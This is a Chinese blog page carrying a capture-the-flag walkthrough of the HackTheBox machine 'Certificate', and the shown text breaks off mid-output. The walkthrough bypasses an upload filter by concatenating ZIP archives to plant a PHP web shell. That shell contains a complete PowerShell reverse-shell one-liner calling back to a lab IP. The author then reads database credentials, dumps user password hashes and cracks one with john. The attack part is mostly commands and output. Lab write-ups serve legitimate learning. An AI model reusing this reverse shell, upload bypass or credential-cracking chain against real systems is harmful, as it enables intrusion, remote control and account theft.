<!DOCTYPE html><html lang="zh-CN"><head><meta charSet="utf-8" data-next-head=""/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0" data-next-head=""/><meta name="robots" content="index,follow" data-next-head=""/><meta name="description" content="Sunset的个人博客" data-next-head=""/><meta name="twitter:card" content="summary_large_image" data-next-head=""/><meta name="twitter:site" content="@sunset" data-next-head=""/><meta name="twitter:creator" content="@sunset" data-next-head=""/><meta property="og:title" content="Sunset Blog" data-next-head=""/><meta property="og:description" content="Sunset的个人博客" data-next-head=""/><meta property="og:url" content="https://sunsetaction.top" data-next-head=""/><meta property="og:type" content="website" data-next-head=""/><meta property="og:image" content="https://sunsetaction.top/images/logo.png" data-next-head=""/><meta property="og:image:alt" content="Sunset Blog" data-next-head=""/><meta property="og:image:width" content="1200" data-next-head=""/><meta property="og:image:height" content="630" data-next-head=""/><meta property="og:locale" content="zh_CN" data-next-head=""/><meta property="og:site_name" content="Sunset Blog" data-next-head=""/><link rel="canonical" href="https://sunsetaction.top" data-next-head=""/><meta property="dc:creator" content="Sunset" data-next-head=""/><meta name="application-name" content="Sunset Blog" data-next-head=""/><link rel="icon" href="/images/Logo.ico" data-next-head=""/><title data-next-head="">重定向中...</title><meta name="description" content="Sunset的个人博客 - 记录生活和学习的点滴"/><meta name="keywords" content="sunset, blog, 技术博客, 编程, 个人网站"/><meta name="author" content="Sunset"/><link rel="canonical" href="https://sunsetaction.top"/><meta property="og:title" content="Sunset&#x27;s Blog"/><meta property="og:description" content="记录生活和学习的点滴"/><meta property="og:url" content="https://sunsetaction.top"/><meta property="og:type" content="website"/><link rel="preload" href="/_next/static/css/1313794ff57095ab.css" as="style"/><link rel="stylesheet" href="/_next/static/css/1313794ff57095ab.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" noModule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="/_next/static/chunks/webpack-0d12d6e4400a07d7.js" defer=""></script><script src="/_next/static/chunks/framework-2f335d22a7318891.js" defer=""></script><script src="/_next/static/chunks/main-57af89c0b17dff61.js" defer=""></script><script src="/_next/static/chunks/pages/_app-603a6856ad27351b.js" defer=""></script><script src="/_next/static/chunks/669-a48a697ea8aebbc4.js" defer=""></script><script src="/_next/static/chunks/pages/posts/%5Bid%5D-6fbfdb3e812309fb.js" defer=""></script><script src="/_next/static/zhUbpfrrtSfTpjx7rkQnM/_buildManifest.js" defer=""></script><script src="/_next/static/zhUbpfrrtSfTpjx7rkQnM/_ssgManifest.js" defer=""></script></head><body><div id="__next"><div class="w-full" style="opacity:0;transform:translateY(20px)"><div class="text-gray-700 dark:text-gray-300 flex flex-col min-h-screen font-[LXGWWenKai] bg-[#fafafa] dark:bg-[#1f2022] transition-colors duration-300"><div class="flex flex-col items-center justify-center"><header class="flex justify-center md:mt-12 mt-5"><div><div class="flex items-center justify-center md:justify-start"><h1 class="md:text-3xl text-xl font-extrabold text-red-700 dark:text-red-400 ml-4">Sunset&#x27;s Blog</h1></div><div class="mt-2 grid grid-cols-4"><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/">Home</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/writing/">Writing</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/about/">About</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/search/">Search</a></button></div></div></header></div><main class="flex justify-center flex-grow"><div class="w-full md:w-3xl mt-5 md:mt-15 text-center"><p>正在跳转到新地址...</p></div></main><footer class="w-full py-6 mt-12"><div class="max-w-4xl mx-auto px-4 text-center"><p class="text-sm text-gray-500 dark:text-gray-400">Copyright © <!-- -->2025<!-- --> Sunset.</p></div></footer></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"postData":{"id":"HackTheBoxSeason8 - Certificate","contentHtml":"\u003ch1\u003eSeason8 - Certificate\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://app.hackthebox.com/machines/Certificate\"\u003ehttps://app.hackthebox.com/machines/Certificate\u003c/a\u003e | \u003ccode\u003eWindows\u003c/code\u003e | \u003ccode\u003eHard\u003c/code\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2\u003e前期踩点\u003c/h2\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Certificate nmap -sT -min-rate 5000 10.10.11.71             \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-01 21:18 CST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 10.10.11.71\nHost is up (0.050s latency).\nNot shown: 987 filtered tcp ports (no-response)\nPORT     STATE SERVICE\n53/tcp   open  domain\n80/tcp   open  http\n88/tcp   open  kerberos-sec\n135/tcp  open  msrpc\n139/tcp  open  netbios-ssn\n389/tcp  open  ldap\n445/tcp  open  microsoft-ds\n464/tcp  open  kpasswd5\n593/tcp  open  http-rpc-epmap\n636/tcp  open  ldapssl\n3268/tcp open  globalcatLDAP\n3269/tcp open  globalcatLDAPssl\n5985/tcp open  wsman\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Certificate nmap -sT -A -p 80,135,139,445,636,389 10.10.11.71\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-01 21:19 CST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 10.10.11.71\nHost is up (0.076s latency).\n\nPORT    STATE SERVICE       VERSION\n80/tcp  open  http          Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.0.30)\n|_http-title: Did not follow redirect to http://certificate.htb/\n|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.0.30\n135/tcp open  msrpc         Microsoft Windows RPC\n139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)\n|_ssl-\u003cspan class=\"hljs-built_in\"\u003edate\u003c/span\u003e: 2025-06-01T20:59:35+00:00; +7h38m38s from scanner \u003cspan class=\"hljs-keyword\"\u003etime\u003c/span\u003e.\n| ssl-cert: Subject: commonName=DC01.certificate.htb\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:\u0026#x3C;unsupported\u003e, DNS:DC01.certificate.htb\n| Not valid before: 2024-11-04T03:14:54\n|_Not valid after:  2025-11-04T03:14:54\n445/tcp open  microsoft-ds?\n636/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)\n|_ssl-\u003cspan class=\"hljs-built_in\"\u003edate\u003c/span\u003e: 2025-06-01T20:59:36+00:00; +7h38m37s from scanner \u003cspan class=\"hljs-keyword\"\u003etime\u003c/span\u003e.\n| ssl-cert: Subject: commonName=DC01.certificate.htb\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:\u0026#x3C;unsupported\u003e, DNS:DC01.certificate.htb\n| Not valid before: 2024-11-04T03:14:54\n|_Not valid after:  2025-11-04T03:14:54\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e: general purpose\nRunning (JUST GUESSING): Microsoft Windows 2019|10 (97%)\nOS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10\nAggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)\nNo exact OS matches \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e host (\u003cspan class=\"hljs-built_in\"\u003etest\u003c/span\u003e conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: Hosts: certificate.htb, DC01; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-time:\n|   \u003cspan class=\"hljs-built_in\"\u003edate\u003c/span\u003e: 2025-06-01T20:58:58\n|_  start_date: N/A\n|_clock-skew: mean: 7h38m37s, deviation: 0s, median: 7h38m37s\n| smb2-security-mode:\n|   3:1:1:\n|_    Message signing enabled and required\n\nTRACEROUTE (using proto 1/icmp)\nHOP RTT      ADDRESS\n1   85.58 ms 10.10.16.1\n2   87.46 ms 10.10.11.71\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 1 IP address (1 host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 60.74 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e刚刚尝试了\u003ccode\u003eSMB\u003c/code\u003e无法使用匿名账户进行访问，因为还扫描到了\u003ccode\u003e80\u003c/code\u003e端口，所以从\u003ccode\u003eWeb\u003c/code\u003e下手\u003c/p\u003e\n\u003ch2\u003eWeb\u003c/h2\u003e\n\u003cp\u003e访问 \u003ccode\u003eHTTP\u003c/code\u003e 并采集指纹\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Certificate/image.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e其中还有登录页和注册页\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Certificate/image1.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e创建了一个账户 \u003ccode\u003esunset\u003c/code\u003e 并使用账户进行登录，并且用户类型有\u003ccode\u003estudent\u003c/code\u003e和\u003ccode\u003eteacher\u003c/code\u003e，没有发现什么登陆之后才有的功能，教师用户登录不进去\u003c/p\u003e\n\u003cp\u003e扫描一下网站目录\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Certificate dirsearch -u http://certificate.htb/ -e php,txt,zip -x 403,404,503\n/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html\n  from pkg_resources import DistributionNotFound, VersionConflict\n\n  _|. _ _  _  _  _ _|_    v0.4.3\n (_||| _) (/_(_|| (_| )\n\nExtensions: php, txt, zip | HTTP method: GET | Threads: 25 | Wordlist size: 10439\n\nOutput File: /root/Desktop/HackTheBox/Certificate/reports/http_certificate.htb/__25-06-01_21-34-42.txt\n\nTarget: http://certificate.htb/\n\n[21:34:42] Starting: \n[21:34:50] 200 -   14KB - /about.php\n[21:35:01] 500 -  638B  - /cgi-bin/printenv.pl\n[21:35:05] 200 -    0B  - /db.php\n[21:35:09] 200 -    3KB - /footer.php\n[21:35:10] 200 -    2KB - /header.php\n[21:35:15] 200 -    9KB - /login.php\n[21:35:15] 302 -    0B  - /logout.php  -\u003e  login.php\n[21:35:25] 200 -   11KB - /register.php\n[21:35:30] 301 -  343B  - /static  -\u003e  http://certificate.htb/static/\n[21:35:30] 301 -  345B  - /static..  -\u003e  http://certificate.htb/static../\n[21:35:34] 302 -    0B  - /upload.php  -\u003e  login.php\n\nTask Completed\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e扫描出来 \u003ccode\u003eupload.php\u003c/code\u003e 访问一下，貌似缺少参数\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Certificate/image2.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e最后在 \u003ccode\u003ecourse\u003c/code\u003e 中可以找到上传页面\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Certificate/image3.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e该处可能存在文件上传漏洞\u003c/p\u003e\n\u003ch3\u003e文件上传利用 \u0026#x26; ZipSlip? \u0026#x26; \u003cstrong\u003eZIP Concatenation?\u003c/strong\u003e\u003c/h3\u003e\n\u003cp\u003e上传页面中提示：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003ePlease select the assignment file you want to upload (the file will be reviewed by the course instructor)\u003c/p\u003e\n\u003cp\u003e请选择您要上传的作业文件（该文件将由课程讲师审核）\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eWe accept only the following file types: \u003ccode\u003e.pdf\u003c/code\u003e \u003ccode\u003e.docx\u003c/code\u003e \u003ccode\u003e.pptx\u003c/code\u003e \u003ccode\u003e.xlsx\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e我们只接受以下文件类型：\u003ccode\u003e.pdf\u003c/code\u003e \u003ccode\u003e.docx\u003c/code\u003e \u003ccode\u003e.pptx\u003c/code\u003e \u003ccode\u003e.xlsx\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eYou include the assignment file in .zip archive file to reduce it's size\u003c/p\u003e\n\u003cp\u003e将任务文件包含在存档文件中\u003ccode\u003e.zip\u003c/code\u003e以减小其大小\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e经过测试，可以直接上传\u003ccode\u003ePDF\u003c/code\u003e文件，并且会检查文件头。也可以将\u003ccode\u003epdf\u003c/code\u003e以\u003ccode\u003ezip\u003c/code\u003e格式压缩，然后上传（这里不能使用\u003ccode\u003ebindzip\u003c/code\u003e），上传\u003ccode\u003ezip\u003c/code\u003e文件之后会自动进行解压。\u003c/p\u003e\n\u003cp\u003e这里对上传功能点进行了常规的测试，例如修改文件后缀名等等，但是无法成功。\u003c/p\u003e\n\u003cp\u003e通过网络搜索，发现还可能存在 \u003ccode\u003eZipSlip\u003c/code\u003e 漏洞\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://medium.com/@ibm_ptc_security/zip-slip-attack-e3e63a13413f\"\u003ehttps://medium.com/@ibm_ptc_security/zip-slip-attack-e3e63a13413f\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e能达到\u003ccode\u003eRCE\u003c/code\u003e的效果，可以覆盖 \u003ccode\u003e/etc/passwd\u003c/code\u003e 文件或者公钥文件或者其他文件\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e一些利用了\u003ccode\u003eZipSlip\u003c/code\u003e的CTF：\u003ca href=\"https://starlox.medium.com/cyberspace2024-zipzone-ctf-zipslip-vulnerability-00489669feec\"\u003ehttps://starlox.medium.com/cyberspace2024-zipzone-ctf-zipslip-vulnerability-00489669feec\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e我这里尝试了\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Certificate tree zip \nzip\n├── 1.pdf\n└── evil\n    └── test.php\n\n➜  Certificate zip 2.zip zip/*\n  adding: zip/1.pdf (deflated 7%)\n  adding: zip/evil/ (stored 0%)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e然后上传\u003ccode\u003e2.zip\u003c/code\u003e ，但是页面不回显，无法得到上传后的文件夹路径\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e别人分享的一个链接：\u003ca href=\"https://perception-point.io/blog/evasive-concatenated-zip-trojan-targets-windows-users/%EF%BC%8C%E5%85%B6%E4%B8%AD%E7%9A%84\"\u003ehttps://perception-point.io/blog/evasive-concatenated-zip-trojan-targets-windows-users/，其中的\u003c/a\u003e \u003cstrong\u003eChained Archives Explained: Concatenated ZIPs\u003c/strong\u003e 可能对我们有效\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Certificate \u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e               \n1.pdf  evil\n\n➜  Certificate \u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e evil   \ntest.php\n\n➜  Certificate zip -r 1.zip evil\n  adding: evil/ (stored 0%)\n  adding: evil/test.php (stored 0%)\n  \n➜  Certificate zip 2.zip 1.pdf  \n  adding: 1.pdf (deflated 7%)\n  \n➜  Certificate \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e 1.zip 2.zip \u003e 3.zip  （无法上传）\n\n➜  Certificate \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e 2.zip 1.zip \u003e 3.zip  （成功上传）\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e点击访问，并输入 \u003ccode\u003eevil/test.php\u003c/code\u003e 成功执行！！\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Certificate/image4.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e上传一句话木马\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u0026#x3C;?php shell_exec(\u003cspan class=\"hljs-string\"\u003e\"powershell -nop -w hidden -c \\\"\\$client = New-Object System.Net.Sockets.TCPClient('10.10.16.43',4444); \\$stream = \\$client.GetStream(); [byte[]]\\$bytes = 0..65535|%{0}; while((\\$i = \\$stream.Read(\\$bytes, 0, \\$bytes.Length)) -ne 0){; \\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\\$bytes,0,\\$i); \\$sendback = (iex \\$data 2\u003e\u0026#x26;1 | Out-String ); \\$sendback2 = \\$sendback + 'PS ' + (pwd).Path + '\u003e '; \\$sendbyte = ([text.encoding]::ASCII).GetBytes(\\$sendback2); \\$stream.Write(\\$sendbyte,0,\\$sendbyte.Length); \\$stream.Flush()}; \\$client.Close()\\\"\"\u003c/span\u003e);?\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003ePS：这里假如断开了，下次再连接是使用新的端口接收 shell\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003emalicious_files/shell.php\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Certificate/image5.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003eMysql Dump\u003c/h2\u003e\n\u003cp\u003e我们扫描目录的时候能看到存在\u003ccode\u003edb.php\u003c/code\u003e ,我们将其读取\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u0026#x3C;?php\n// Database connection using PDO\ntry {\n    \u003cspan class=\"hljs-variable\"\u003e$dsn\u003c/span\u003e = \u003cspan class=\"hljs-string\"\u003e'mysql:host=localhost;dbname=Certificate_WEBAPP_DB;charset=utf8mb4'\u003c/span\u003e;\n    \u003cspan class=\"hljs-variable\"\u003e$db_user\u003c/span\u003e = \u003cspan class=\"hljs-string\"\u003e'certificate_webapp_user'\u003c/span\u003e; // Change to your DB username\n    \u003cspan class=\"hljs-variable\"\u003e$db_passwd\u003c/span\u003e = \u003cspan class=\"hljs-string\"\u003e'cert!f!c@teDBPWD'\u003c/span\u003e; // Change to your DB password\n    \u003cspan class=\"hljs-variable\"\u003e$options\u003c/span\u003e = [\n        PDO::ATTR_ERRMODE =\u003e PDO::ERRMODE_EXCEPTION,\n        PDO::ATTR_DEFAULT_FETCH_MODE =\u003e PDO::FETCH_ASSOC,\n    ];\n    \u003cspan class=\"hljs-variable\"\u003e$pdo\u003c/span\u003e = new PDO(\u003cspan class=\"hljs-variable\"\u003e$dsn\u003c/span\u003e, \u003cspan class=\"hljs-variable\"\u003e$db_user\u003c/span\u003e, \u003cspan class=\"hljs-variable\"\u003e$db_passwd\u003c/span\u003e, \u003cspan class=\"hljs-variable\"\u003e$options\u003c/span\u003e);\n} catch (PDOException \u003cspan class=\"hljs-variable\"\u003e$e\u003c/span\u003e) {\n    die(\u003cspan class=\"hljs-string\"\u003e'Database connection failed: '\u003c/span\u003e . \u003cspan class=\"hljs-variable\"\u003e$e\u003c/span\u003e-\u003egetMessage());\n}\n?\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e读取数据库的数据\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ePS C:\\xampp\\mysql\\bin\u003e \u0026#x26; \u003cspan class=\"hljs-string\"\u003e\"C:\\xampp\\mysql\\bin\\mysql.exe\"\u003c/span\u003e -u certificate_webapp_user -p\u003cspan class=\"hljs-string\"\u003e\"cert!f!c@teDBPWD\"\u003c/span\u003e -D Certificate_WEBAPP_DB -e \u003cspan class=\"hljs-string\"\u003e\"show tables;\"\u003c/span\u003e\nTables_in_certificate_webapp_db\ncourse_sessions\ncourses\n\u003cspan class=\"hljs-built_in\"\u003eusers\u003c/span\u003e\nusers_courses\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ePS C:\\xampp\\mysql\\bin\u003e \u0026#x26; \u003cspan class=\"hljs-string\"\u003e\"C:\\xampp\\mysql\\bin\\mysql.exe\"\u003c/span\u003e -u certificate_webapp_user -p\u003cspan class=\"hljs-string\"\u003e\"cert!f!c@teDBPWD\"\u003c/span\u003e -D Certificate_WEBAPP_DB -e \u003cspan class=\"hljs-string\"\u003e\"select * from users;\"\u003c/span\u003e\n\u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e      first_name      last_name       username        email   password        created_at      role    is_active\n1       Lorra   Armessa Lorra.AAA       lorra.aaa@certificate.htb       $2y$04\u003cspan class=\"hljs-variable\"\u003e$bZs2FUjVRiFswY84CUR8ve02ymuiy0QD23XOKFuT6IM2sBbgQvEFG\u003c/span\u003e    2024-12-23 12:43:10     teacher 1\n6       Sara    Laracrof        Sara1200        sara1200@gmail.com      $2y$04\u003cspan class=\"hljs-variable\"\u003e$pgTOAkSnYMQoILmL6MRXLOOfFlZUPR4lAD2kvWZj\u003c/span\u003e.i/dyvXNSqCkK    2024-12-23 12:47:11     teacher 1\n7       John    Wood    Johney  johny009@mail.com       $2y$04\u003cspan class=\"hljs-variable\"\u003e$VaUEcSd6p5NnpgwnHyh8zey13zo\u003c/span\u003e/hL7jfQd9U.PGyEW3yqBf.IxRq    2024-12-23 13:18:18     student 1\n8       Havok   Watterson       havokww havokww@hotmail.com     $2y$04\u003cspan class=\"hljs-variable\"\u003e$XSXoFSfcMoS5Zp8ojTeUSOj6ENEun6oWM93mvRQgvaBufba5I5nti\u003c/span\u003e    2024-12-24 09:08:04     teacher 1\n9       Steven  Roman   stev    steven@yahoo.com        $2y$04\u003cspan class=\"hljs-variable\"\u003e$6FHP\u003c/span\u003e.7xTHRGYRI9kRIo7deUHz0LX.vx2ixwv0cOW6TDtRGgOhRFX2    2024-12-24 12:05:05     student 1\n10      Sara    Brawn   sara.b  sara.b@certificate.htb  $2y$04\u003cspan class=\"hljs-variable\"\u003e$CgDe\u003c/span\u003e/Thzw/Em/M4SkmXNbu0YdFo6uUs3nB.pzQPV.g8UdXikZNdH6    2024-12-25 21:31:26     admin   1\n12      sunset  sunset  sunset  1@q.xom $2y$04\u003cspan class=\"hljs-variable\"\u003e$46hjL\u003c/span\u003e/TUPqsT3KI7R/6tje1JOSy5.riL8ABfus1G8WZujELAgnQvy    2025-06-01 16:49:22     student 1\n13      r       r       admin   t@t.com $2y$04\u003cspan class=\"hljs-variable\"\u003e$ui6Qc\u003c/span\u003e/eaGGRKK2ovA4iJne7qbd1uSkm5lVbEHnPWWKYYwzb2s0hY2    2025-06-01 16:49:28     student 1\n14      sunset2 sunset2 sunset2 1@qq.com        $2y$04\u003cspan class=\"hljs-variable\"\u003e$F5Rr9QzbhhaEh7QhJKKwz\u003c/span\u003e.ClZdVaA9QPI9RBdy8v.G/Pc7TDAO196    2025-06-01 16:57:14     student 1\n16      admin123        admin123        admin123        admin123@gmail.com      $2y$04\u003cspan class=\"hljs-variable\"\u003e$ViY8NzbVBvUlwppQcDrld\u003c/span\u003e.mh.1XcGQkc4lt6j5Uhj7IPyGq4Z0hQu    2025-06-01 16:59:02     student 1\n17      Admin   Admin   adminsucks      admin@gmail.com $2y$04\u003cspan class=\"hljs-variable\"\u003e$FMa5TpAFpTDu5EwgVzybnuAJFryR18dzfSqZGLQFzHhqj\u003c/span\u003e/BwksTdy    2025-06-01 17:12:43     student 1\n18      admin   adnim   adminadnim      admin@adnim.com $2y$04\u003cspan class=\"hljs-variable\"\u003e$x\u003c/span\u003e.Ak4KXkM.MLNA0JgCEPxevbFuBioVs5NONlqrw.eO2js1/5AQh8i    2025-06-01 17:14:15     teacher 0\n19      1       2       3       \u003cspan class=\"hljs-built_in\"\u003etest\u003c/span\u003e@test.com   $2y$04\u003cspan class=\"hljs-variable\"\u003e$dFR\u003c/span\u003e.yVKC/u9UwlPsyxa5fO11vPvZnFUhRxi2Uf25SoGQRaTE6SmBW    2025-06-01 17:16:12     teacher 0\n20      test2   test2   test2   test2@test.com  $2y$04\u003cspan class=\"hljs-variable\"\u003e$Ci4wfETizE9WCrUgpC4tyuI7s4oLIpK\u003c/span\u003e/DWb/uhjO2IKTRIfD9JUGy    2025-06-01 17:17:40     teacher 0\n22      test3   test3   test3   test3@test.com  $2y$04\u003cspan class=\"hljs-variable\"\u003e$m51Lz73GtqPoAzovxJeCM\u003c/span\u003e.B8/SAkDERIl7OBZfxAAQahNpiVFPsKe    2025-06-01 17:34:30     student 1\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Certificate/image6.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e其中我们感兴趣的用户有两条\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e10      Sara    Brawn   sara.b  sara.b@certificate.htb  $2y$04\u003cspan class=\"hljs-variable\"\u003e$CgDe\u003c/span\u003e/Thzw/Em/M4SkmXNbu0YdFo6uUs3nB.pzQPV.g8UdXikZNdH6    2024-12-25 21:31:26     admin   1\n1       Lorra   Armessa Lorra.AAA       lorra.aaa@certificate.htb       $2y$04\u003cspan class=\"hljs-variable\"\u003e$bZs2FUjVRiFswY84CUR8ve02ymuiy0QD23XOKFuT6IM2sBbgQvEFG\u003c/span\u003e    2024-12-23 12:43:10     teacher 1\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e对密码进行爆破\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Certificate john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt \u003cspan class=\"hljs-built_in\"\u003ehash\u003c/span\u003e  \nUsing default input encoding: UTF-8\nLoaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X3])\nCost 1 (iteration count) is 16 \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e all loaded hashes\nWill run 8 OpenMP threads\nPress \u003cspan class=\"hljs-string\"\u003e'q'\u003c/span\u003e or Ctrl-C to abort, almost any other key \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e status\nBlink182         (?)   \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e爆破了好一会将\u003ccode\u003esara.b\u003c/code\u003e 的密码爆破出来了\u003c/p\u003e\n\u003cp\u003e测试用户有效性\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Certificate nxc smb 10.10.11.71 -u sara.b -p Blink182 -d certificate.htb\nSMB         10.10.11.71     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certificate.htb) (signing:True) (SMBv1:False)\nSMB         10.10.11.71     445    DC01             [+] 